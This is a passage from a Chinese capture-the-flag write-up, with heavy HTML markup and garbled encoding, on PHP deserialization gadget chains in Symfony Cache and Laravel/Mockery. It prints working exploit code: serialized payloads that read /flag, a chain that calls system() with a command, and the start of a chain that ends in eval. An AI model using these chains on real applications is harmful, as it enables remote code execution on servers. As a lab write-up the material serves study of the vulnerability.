&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="é“¾å­2---rce">é“¾å­2 - rce&lt;/h2>
&lt;p>å›åˆ°å‰é¢åœ¨ç›¸åŒå‘½åç©ºé—´ä¸‹æ‰¾&lt;code>saveDeferred()&lt;/code>çš„åœ°æ–¹ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªç±»ä¹Ÿæœ‰åŒæ ·çš„æ–¹æ³• vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>è·Ÿè¿›&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223è¡Œå¯ä»¥åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œ&lt;code>setInnerItem&lt;/code>å¯æ§ æˆ‘ä»¬å¯ä»¥è°ƒç”¨&lt;code>system()&lt;/code>ï¼Œæ¥ä¸‹æ¥ç¡®è®¤å®ƒè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°å¯ä¸å¯æ§&lt;/p>
&lt;p>å¯¹äº&lt;code>$item&lt;/code>ï¼Œæ˜¯è°ƒç”¨å‡½æ•°&lt;code>doSave()&lt;/code>å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯&lt;code>saveDeferred()&lt;/code>æ—¶çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ï¼Œå¯æ§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>å¯¹äº&lt;code>$innerItem&lt;/code>æœ‰è¿™æ ·ä¸€ä¸ªifåˆ¤æ–­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>å…‰çœ‹è¿™ä¸ªåˆ¤æ–­è‚¥è‚ çš„çªå…€ï¼Œè¿˜è¦ç»“åˆ207è¡Œçš„&lt;code>$item = (array) $item;&lt;/code>ï¼Œå®ƒå°†ä¸€ä¸ªç±»å¼ºè¡Œè½¬æ¢æˆæ•°ç»„ï¼Œè€Œåé¢è·Ÿç€çš„è¿™ä¸ªifåˆ¤æ–­å°±æ˜¯ä¸ºäº†è§£å†³ç±»ä¸­åŸæœ‰çš„ &lt;em>protected&lt;/em>çš„å±æ€§å†²çªï¼Œæ‰€ä»¥éœ€è¦åœ¨ç›¸åŒçš„å‘½åç©ºé—´é‡Œæ¥ç€æ‰¾ä¸€ä¸ªç±»ï¼ŒåŒ…å«&lt;code>pollHash&lt;/code>å’Œ&lt;code>innerItem&lt;/code>å±æ€§ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‰¾åˆ°äº†CacheItemï¼ˆå‰é¢ä¹Ÿæ˜¯å®ƒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>æ„é€ exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°å°è¯•ä¸€ä¸‹ï¼ˆæ‡’å¾—å†å¼€é¶æœºäº†w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>æˆåŠŸäº†æ&lt;/p>
&lt;h2 id="é“¾å­3---rce">é“¾å­3 - rce&lt;/h2>
&lt;p>åœ¨ &lt;strong>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1&lt;/strong>è¿™é“é¢˜é‡Œèµµå¸ˆå‚…æŠŠè¿™æ¡è·¯å µæ­»äº†ï¼Œä½†æ˜¯æœ¬åœ°å¤ç°æ— æ‰€è°“å•¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>æŠŠè¿™ä¸ªæ³¨é‡Šå–æ¶ˆå³å¯&lt;/p>
&lt;p>çœ‹åˆ°å®ƒè°ƒç”¨äº†&lt;code>events&lt;/code>çš„&lt;code>dispatch&lt;/code>æ–¹æ³•ï¼Œè·Ÿä¸Šé¢æ€è·¯ä¸€æ ·ï¼Œæ¥ç€æ‰¾ä¸€ä¸ªå¯ç”¨çš„åˆ«çš„ç±»é‡Œçš„&lt;code>dispatch&lt;/code>ï¼Œæ¯”å¦‚vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>çœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­çš„è¿”å›æ—¶è°ƒç”¨çš„&lt;code>dispatchNow()&lt;/code>æ˜¯ä»€ä¹ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150è¡Œæœ‰äº®ç‚¹å•Šï¼Œä½¿ç”¨äº†&lt;code>call_user_func&lt;/code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°æ¥è‡ª&lt;code>$command&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å§‹æ‰¾çš„ææ„å‡½æ•°è°ƒç”¨çš„&lt;code>$this-&amp;gt;event&lt;/code>ï¼›ç°åœ¨è¦æ‰¾ä¸€ä¸ªç±» å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åæˆ‘ä»¬çš„rceå‘½ä»¤ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ï¼Œå®Œæˆæ•´ä¸ªé“¾å­&lt;/p>
&lt;p>ä¸è¿‡å…ˆä¸æ€¥ï¼Œé¦–å…ˆè¦æ»¡è¶³&lt;code>dispatch()&lt;/code>ä¸­çš„ifåˆ¤æ–­&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>ï¼Œå‰ä¸€ä¸ªå¯æ§ï¼Œçœ‹çœ‹åé¢è¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>éœ€è¦&lt;code>$command&lt;/code>å¿…é¡»æ˜¯ä¸€ä¸ªå®ç°äº†&lt;code>ShouldQueue&lt;/code>æ¥å£çš„ç±»ï¼Œæ‰¾åˆ°è¿™ä¸ª vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
&lt;p>ç„¶åæ¥ç€æ‰¾é€‚åˆåš&lt;code>call_user_func()&lt;/code>ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»ï¼Œå®ƒéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•° vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>è¿™ä¸ª&lt;code>load()&lt;/code>å¯ä»¥ç›´æ¥è°ƒç”¨evalæ‰§è¡Œä»£ç ï¼Œä½†æ˜¯&lt;code>$defination&lt;/code>è¦æ»¡è¶³ifçš„åˆ¤æ–­ï¼Œè·Ÿè¿›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>éœ€è¦é¢å¤–å†æ‰¾ä¸¤ä¸ªç±»ï¼Œç¬¬ä¸€ä¸ªç±»å…·æœ‰&lt;code>code&lt;/code>å±æ€§ï¼Œç¬¬äºŒç±»åˆ&lt;code>getName&lt;/code>å‡½æ•°ï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªç±»çš„configå±æ€§&lt;/p>
&lt;p>å¯ç”¨çš„ç¬¬ä¸€ä¸ªç±»å°±æ˜¯&lt;code>getClassName()&lt;/code>æ‰€åœ¨çš„ç±» vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>ç¬¬äºŒä¸ªæ˜¯ vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>æ€»ç»“ä»¥ä¸Šçš„è¿‡ç¨‹ï¼Œå†™exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
